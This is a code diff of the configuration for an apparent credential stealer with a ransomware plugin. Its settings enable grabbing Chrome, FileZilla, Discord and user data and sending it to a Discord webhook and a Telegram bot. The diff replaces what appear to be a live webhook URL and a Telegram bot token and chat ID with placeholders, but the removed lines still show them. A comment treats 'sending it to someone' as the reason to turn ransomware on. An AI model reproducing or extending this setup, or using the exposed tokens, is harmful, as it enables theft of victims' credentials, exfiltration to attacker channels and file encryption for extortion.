@@ -18,15 +18,15 @@ from plugins.ransomware import Ransomware
 from plugins.cleanup import CleanUp
 
 CONFIG = {
-    "webhook" : "https://discord.com/api/webhooks/1135745003604430878/MTjCGvBPLpLeWeLTfeZg4RNzl2jP4pToaLtrZ1CnvFl4y4Ai6dojaYnCejzkCPdFmBjM", # Webhook here 
+    "webhook" : "WEBHOOKHERE", # Webhook here 
     "chrome" : True,  # make sure if you want any of these to not work set them to 'False' if you want them to work Keep them as 'True'
     "filezilla":True,  # make sure if you want any of these to not work set them to 'False' if you want them to work Keep them as 'True'
     "userdata":True,  # make sure if you want any of these to not work set them to 'False' if you want them to work Keep them as 'True'
     "discord":True,  # make sure if you want any of these to not work set them to 'False' if you want them to work Keep them as 'True'
     "send_discord": True,  # make sure if you want any of these to not work set them to 'False' if you want them to work Keep them as 'True'
     "send_telegram": True,  # make sure if you want any of these to not work set them to 'False' if you want them to work Keep them as 'True'
-    "telegram_token": "6248198822:AAHQddndAoI0gTrEuY7LO347nzfwvs4gofM", # Create a bot with Bot Father and obtain the bot token 
-    "telegram_chat_id": "5771044879", # Create a bot with Bot Father and obtain the bot chat ID if you dont know how to any of these go on youtube
+    "telegram_token": "here", # Create a bot with Bot Father and obtain the bot token 
+    "telegram_chat_id": "here", # Create a bot with Bot Father and obtain the bot chat ID if you dont know how to any of these go on youtube
     "ransomware" : {
         "enabled" : False, # Keep this on False unless your sending it to someone or your testing on a VM
         "target_dir" : "C:\\Users\\", # Dont change anything unless you know what you are doing 
